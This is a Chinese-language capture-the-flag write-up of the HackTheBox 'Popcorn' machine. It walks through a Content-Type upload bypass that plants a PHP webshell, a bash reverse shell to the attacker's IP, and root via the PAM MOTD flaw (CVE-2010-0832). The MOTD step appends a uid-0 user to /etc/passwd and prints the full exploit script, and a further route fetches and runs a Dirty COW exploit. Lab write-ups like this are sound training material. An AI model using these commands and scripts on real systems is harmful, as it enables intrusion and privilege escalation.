Popcorn是一个中等难度的靶机，知识点涉及文件上传绕过、MODT提权、脏牛提权等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2022-05-06
10.37.29](https://image.3001.net/images/20221101/1667288063_6360cbff591256fb26ea6.png!small)

 _通关思维导图_

![Json](https://image.3001.net/images/20221101/1667288065_6360cc014917d09f5e377.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.6 -oA nmap_Popcorn
    

![截屏2022-05-06
12.46.55](https://image.3001.net/images/20221101/1667288067_6360cc032f04350d65328.png!small)  
扫描结果显示目标开放了22、80端口

#### 80端口

访问后是 Apache 默认运行界面  
![截屏2022-05-06
16.54.20](https://image.3001.net/images/20221101/1667288068_6360cc04adee0177d4e56.png!small)

使用 gobuster 扫描发现目录`/test`、`/torrent`、`/rename`

    
    
    gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
    

![截屏2022-05-06
17.31.35](https://image.3001.net/images/20221101/1667288070_6360cc0612336c0c91081.png!small)

**test**

访问目录`/test`是`phpinfo`界面。其中值得注意的是配置是`file_uploads=open`，如果存在文件包含可执行代码  
![截屏2022-05-06
17.33.16](https://image.3001.net/images/20221101/1667288071_6360cc07890916b032122.png!small)  
 **rename**

访问目录`/rename`是一个用于重命名的 API 接口  
![截屏2022-05-06
17.59.32](https://image.3001.net/images/20221101/1667288073_6360cc0920c75102d9eec.png!small)

尝试构造 payload 将`index.html`重命名为`mac.html`

    
    
    http://10.10.10.6/rename/index.php?filename=index.html&newfilename=mac.html
    

![截屏2022-05-06
23.33.41](https://image.3001.net/images/20221101/1667288074_6360cc0a840156c805141.png!small)

但并没有成功重命名，与此同时它还暴露了绝对路径。那么我们可以有这样一个思路：找到一个文件上传点上传带有 php 代码的图片，通过这个 API 修改后缀名为
php，从而达到上传木马的效果

 **torrent**

目录`/torrent`提供 Torrent Hoster 的实例，但点击`Upload`会重定向到登录界面，由此推断使用该功能需要经过身份认证  
![截屏2022-05-06
23.43.50](https://image.3001.net/images/20221101/1667288075_6360cc0be3cc964aefdae.png!small)

访问`Browse`存在一个名为 Kali Linux 的`torrent`  
![截屏2022-05-06
23.48.28](https://image.3001.net/images/20221101/1667288077_6360cc0dab1498891c8ea.png!small)

尝试在其中注册用户`mac/mac`并输入邮箱`mac@mac.com`  
![截屏2022-05-06
23.51.20](https://image.3001.net/images/20221101/1667288079_6360cc0f2ae6defdf4c05.png!small)

![截屏2022-05-06
23.51.52](https://image.3001.net/images/20221101/1667288080_6360cc109ac1ca1e7ac13.png!small)

使用刚注册的账户`mac/mac`登录成功  
![截屏2022-05-06
23.56.32](https://image.3001.net/images/20221101/1667288081_6360cc11f2c733254126f.png!small)

在`Upload`功能点中能够上传`Torrent`种子文件  
![截屏2022-05-06
23.58.55](https://image.3001.net/images/20221101/1667288083_6360cc139c79e8c65e9d8.png!small)

尝试在此处上传 webshell，但上传失败。  
![截屏2022-05-07
00.02.41](https://image.3001.net/images/20221101/1667288084_6360cc14e9baf561cf42d.png!small)

那么尝试上传一个有效的`Torrent`种子文件呢？  
 **Kali种子地址：https://kali.download/base-images/kali-2022.1/kali-linux-2022.1-installer-amd64.iso.torrent**  
![截屏2022-05-07
01.09.50](https://image.3001.net/images/20221101/1667288086_6360cc166283d77275731.png!small)

提交上传后等一分钟可重定向至`Torrent`界面  
![截屏2022-05-07
01.18.24](https://image.3001.net/images/20221101/1667288087_6360cc17f3f460d868318.png!small)

点击`Edit this torrent`后会跳出新表单如下：  
![截屏2022-05-07
01.20.34](https://image.3001.net/images/20221101/1667288089_6360cc19937f6a9cb16e2.png!small)

在其中上传与该种子相关的图片，结果显示上传完成  
![截屏2022-05-07
01.25.15](https://image.3001.net/images/20221101/1667288091_6360cc1b24dca82fa2561.png!small)

图片地址为`/thumbnail.php?gd=2&src=./upload/708759a17400cb3d4368e4769048f3d61e5466e3.png&maxw=96`，此
URL 结构可能存在文件包含漏洞  
![截屏2022-05-07
01.26.47](https://image.3001.net/images/20221101/1667288092_6360cc1c513526141f367.png!small)

与此同时`src`还指向了一个路径`http://10.10.10.6/torrent/upload/`，访问后发现上传的所有图片路径  
![截屏2022-05-07
01.30.11](https://image.3001.net/images/20221101/1667288093_6360cc1ddad03a95d9085.png!small)

## 0x02 上线[www-data]

### 文件上传绕过

综上可以发现两个文件上传点，分别为 torrent 以及 torrent 对应图片。显然我们对图片上传点更感兴趣，但直接上传 webshell
目标会进行拦截，尝试使用一些常见的绕过方法进行测试

>   * 修改文件扩展名
>
>   * 修改 Content-Type
>
>   * 修改文件上传内容
>
>

上传图片后使用 BurpSuite 截取数据包并发送至 Repeater 进行测试  
![截屏2022-05-07
09.52.36](https://image.3001.net/images/20221101/1667288095_6360cc1f7aa9a7aa2a13c.png!small)

尝试直接修改文件扩展名为`.php`、`Content-Type`为`application/x-php`，点击发送后无法上传  
![截屏2022-05-07
09.46.15](https://image.3001.net/images/20221101/1667288096_6360cc20eecf3056e22f7.png!small)

尝试修改`Content-Type`值为`image/png`后上传成功，猜测 web 应用程序主要判断`Content-type`类型，将其修改为正常的图片类型可绕过上传限制  
![截屏2022-05-07
09.50.15](https://image.3001.net/images/20221101/1667288098_6360cc228b757a092e5ce.png!small)

为了验证这一猜想，尝试只修改图片上传数据包的`Content-type`的值。结果同样也无法上传，说明猜想正确  
![截屏2022-05-07
09.44.53](https://image.3001.net/images/20221101/1667288100_6360cc24144d07f5295a6.png!small)

访问`/torrent/upload`路径并找到上传木马文件的地址  
![截屏2022-05-07
10.04.36](https://image.3001.net/images/20221101/1667288101_6360cc2566b6fb8468fdc.png!small)

访问木马地址并尝试执行命令，命令执行成功

    
    
    curl http://10.10.10.6/torrent/upload/708759a17400cb3d4368e4769048f3d61e5466e3.php?cmd=id
    

![截屏2022-05-07
10.09.02](https://image.3001.net/images/20221101/1667288102_6360cc2691c08aeb9c39b.png!small)

### 反弹shell

在本地监听 443 端口用于接收反弹shell

    
    
    nc nvlp 443
    

使用木马执行命令执行反弹shell

    
    
    curl http://10.10.10.6/torrent/upload/708759a17400cb3d4368e4769048f3d61e5466e3.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"
    

![截屏2022-05-07
10.14.21](https://image.3001.net/images/20221101/1667288103_6360cc27b1adec6b1d81c.png!small)

收到反弹shell后在`/home`目录中成功找到第一个flag

    
    
    cd /home/george
    cat user.txt
    

![截屏2022-05-07
10.16.41](https://image.3001.net/images/20221101/1667288105_6360cc2903803d51dc9ad.png!small)

## 0x03 权限提升[root]

### MODT提权

枚举`/home`目录发现文件`motd.legal-displayed`，MOTD 是 message of the day 的缩写，通常在用户成功登录到
Linux 后出现，其内容就是登录后的提示信息，而此类文件的出现意味着可能存在 Ubuntu PAM MOTD 本地提权漏洞（CVE-2010-0832）

 **参考文章：https://www.exploit-db.com/exploits/14339**

    
    
    ls -la
    find . -type f -ls
    

![截屏2022-05-07
10.21.58](https://image.3001.net/images/20221101/1667288106_6360cc2a45b2ec8f2e199.png!small)![截屏2022-05-07
10.23.14](https://image.3001.net/images/20221101/1667288107_6360cc2b8f9e17f875ffd.png!small)

通过阅读该漏洞的利用代码可知：Ubuntu 在用户登录时会调用 PAM
对`~/.cache`设置目录权限，只要将`~/.cache`替换为需要的文件符号链接，比如`passwd`。替换完成后再次登录该文件会被当前用户调用，从而完成权限提升。但由于当前环境为反弹shell，无法进行用户登录，因此我们需要将
SSH 密钥写入服务器当中用于免密登录

#### SSH免密登录

查看当前用户对`~/.cache`目录的权限，该目录中的`motd.legal-displayed`归 george
所有，权限为可读可写，因此无法删除该文件

    
    
    ls -l .cache
    

![截屏2022-05-07
10.57.17](https://image.3001.net/images/20221101/1667288108_6360cc2cb4e3d18e85d11.png!small)

在当前用户的主目录`/var/www`下创建`.ssh`目录后使用 ssh-keygen 生成 SSH 密钥对

    
    
    cd ~
    mkdir .ssh
    ssh-keygen -q -t rsa -N '' -C 'pam'
    ls .ssh
    

![截屏2022-05-07
11.08.09](https://image.3001.net/images/20221101/1667288109_6360cc2dcef94f333d5b9.png!small)

复制公钥为`authorized_keys`并将权限设置为600

    
    
    cp .ssh/id_rsa.pub .ssh/authorized_keys
    chmod 600 .ssh/authorized_keys
    

![截屏2022-05-07
11.12.19](https://image.3001.net/images/20221101/1667288110_6360cc2ee463ff8911f9c.png!small)

需要注意的是目录中并没有`.cache`目录

    
    
    ls -la
    

![截屏2022-05-07
11.12.26](https://image.3001.net/images/20221101/1667288112_6360cc30054c1fa2c15eb.png!small)

复制 www-data 用户私钥至本地后指定密钥完成 ssh 免密登录

    
    
    chmod 600 key
    ssh -i key www-data@10.10.10.6
    

![截屏2022-05-07
11.23.37](https://image.3001.net/images/20221101/1667288113_6360cc3144b3657b99af8.png!small)

在用户主目录`/var/www`下出现`~/.cache`目录，并在其中发现`motd.legal-displayed`文件

    
    
    find .cache/ -type f -ls
    

![截屏2022-05-07
11.27.13](https://image.3001.net/images/20221101/1667288114_6360cc32a70fd2792f59b.png!small)

#### 添加用户

删除`~/.cache`目录并替换为`/etc/passwd`的文件符号链接

    
    
    rm -rf ~/.cache
    ln -s /etc/passwd ~/.cache
    ls -la ~/.cache
    

![截屏2022-05-07
11.31.23](https://image.3001.net/images/20221101/1667288115_6360cc3396a17e1205135.png!small)

再次登录 ssh 发现`/etc/passwd`权限已经归 www-data 所有，既然有了写入权限，那么就可以在其中尝试添加管理员用户

    
    
    ssh -i key www-data@10.10.10.6
    ls -la /etc/passwd
    

![截屏2022-05-07
11.33.48](https://image.3001.net/images/20221101/1667288116_6360cc34afdbc572b49e0.png!small)

利用 openssl 生成密码的哈希值

    
    
    openssl passwd -1 mac
    

![截屏2022-05-07
11.36.32](https://image.3001.net/images/20221101/1667288118_6360cc3611d0bd014d11a.png!small)

尝试添加用户至`/etc/passwd`，其中用户和密码都是 mac，用户和用户组都为0代表 root，描述为
pwned，主目录是`/root`，shell 是`/bin/bash`

    
    
    echo 'mac:$1$Of8Jy30x$uJx7pE./n1MKDpac9gBsk1:0:0:pwned:/root:/bin/bash' >> /etc/passwd
    

使用`su`命令获取 root 权限

    
    
    su - mac
    id
    

![截屏2022-05-07
13.08.58](https://image.3001.net/images/20221101/1667288119_6360cc3701db052131a09.png!small)

在`/root`目录下成功找到第二个flag

    
    
    cat root.txt
    

![截屏2022-05-07
13.09.19](https://image.3001.net/images/20221101/1667288120_6360cc38257575d319dfa.png!small)

#### 脚本分析

    
    
    P='toor:x:0:0:root:/root:/bin/bash'
    S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'
    echo "[*] Ubuntu PAM MOTD local root"
    [ -z "$(which ssh)" ] && echo "[-] ssh is a requirement" && exit 1
    [ -z "$(which ssh-keygen)" ] && echo "[-] ssh-keygen is a requirement" && exit 1
    [ -z "$(ps -u root |grep sshd)" ] && echo "[-] a running sshd is a requirement" && exit 1
    backup() {
        [ -e "$1" ] && [ -e "$1".bak ] && rm -rf "$1".bak
        [ -e "$1" ] || return 0
        mv "$1"{,.bak} || return 1
        echo "[*] Backuped $1"
    }
    restore() {
        [ -e "$1" ] && rm -rf "$1"
        [ -e "$1".bak ] || return 0
        mv "$1"{.bak,} || return 1
        echo "[*] Restored $1"
    }
    key_create() {
        backup ~/.ssh/authorized_keys
        ssh-keygen -q -t rsa -N '' -C 'pam' -f "$KEY" || return 1
        [ ! -d ~/.ssh ] && { mkdir ~/.ssh || return 1; }
        mv "$KEY.pub" ~/.ssh/authorized_keys || return 1
        echo "[*] SSH key set up"
    }
    key_remove() {
        rm -f "$KEY"
        restore ~/.ssh/authorized_keys
        echo "[*] SSH key removed"
    }
    own() {
        [ -e ~/.cache ] && rm -rf ~/.cache
        ln -s "$1" ~/.cache || return 1
        echo "[*] spawn ssh"
        ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true
        [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }
        echo "[+] owned: $1"
    }
    bye() {
        key_remove
        exit 1
    }
    KEY="$(mktemp -u)"
    key_create || { echo "[-] Failed to setup SSH key"; exit 1; }
    backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }
    own /etc/passwd && echo "$P" >> /etc/passwd
    own /etc/shadow && echo "$S" >> /etc/shadow
    restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }
    key_remove
    echo "[+] Success! Use password toor to get root"
    su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
      chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&amp1 bash" toor
    

脚本分别定义了`backup()`、`restore()`、`key_create()`、`key_remove()`、`own()`、`bye()`等一堆函数，执行流程如下：

>   * `key_create()`创建SSH密钥对以便当前用户通过私钥无密码登录
>
>   * `backup()`备份`~/.cache`目录
>
>   *
> `own()`会删除`~/.cache`目录并创建文件符号链接，通过该函数分别指向`/etc/passwd`、`/etc/shadow`，然后断开连接验证当前用户是否已拥有目标文件的写入权限
>
>   * `restore()`用来恢复`~/.cache`目录
>
>   * `key_remove()`则会清理刚刚添加的SSH密钥
>
>   * 清理痕迹完成后再自动启动 root 权限的 shell
>
>

### 脏牛提权

脏牛提权是 Linux 中经典的内核提权方式，首先使用命令查看系统版本

    
    
    uname -a
    

![截屏2022-05-07
16.05.14](https://image.3001.net/images/20221101/1667288121_6360cc391a8b824c40786.png!small)

在漏洞利用参考列表中发现该版本的 ubuntu 系统能够使用脏牛提权。根据 POC 列表我们可使用
[dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)直接提权

 **参考列表：https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions**

 **POC列表：https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs**

使用 python 开启 web 服务用于传输利用代码`dirty.c`

    
    
    python3 -m http.server 80
    

在靶机中通过 wget 下载利用代码并完成编译

    
    
    wget http://10.10.14.7/dirty.c
    chmod 777 dirty.c
    gcc -pthread dirty.c -o dirty -lcrypt
    

![截屏2022-05-07
16.22.52](https://image.3001.net/images/20221101/1667288122_6360cc3a58f47f515ad3f.png!small)

运行后可成功提权

    
    
    chmod +x dirty
    ./dirty
    

![截屏2022-05-07
16.27.37](https://image.3001.net/images/20221101/1667288123_6360cc3baf8660756791c.png!small)

由于`su`命令必须在终端执行，因此需要以 www-data 用户身份登录 ssh，输入以上账号密码可成功获取 root 权限

    
    
    su - firefart
    id
    

![截屏2022-05-07
16.29.54](https://image.3001.net/images/20221101/1667288125_6360cc3d1304300f833c5.png!small)

## 0x04 总结

Popcorn 译为爆米花，通过对站点进行目录扫描后发现三个目录，分别是phpinfo界面、重命名API以及提供 Torrent Hoster
实例的应用程序。在应用中注册用户后发现存在种子文件上传点和对应的图片上传点。在尝试对图片上传点上传木马后发现应用存在防御机制，修改 Content-Type
可绕过限制。利用目录遍历遍历发现上传后的木马位置，使用木马执行命令可成功收到反弹shell。

上线后当前权限为 www-data，通过信息收集发现 MOTD 文件，MODT 存在历史提权漏洞，其主要成因是用户登录时会调用 PAM
对`~/.cache`设置目录权限，因此需要生成密钥对来登录目标用户ssh，将`~/.cache`替换为`/etc/passwd`的文件符号链接，再次登录后会调用
PAM 重设该命令所有者，最终在`/etc/passwd`中添加管理员用户完成权限提升。当然还有个经典方法：脏牛提权，这个方式就不再赘述了。

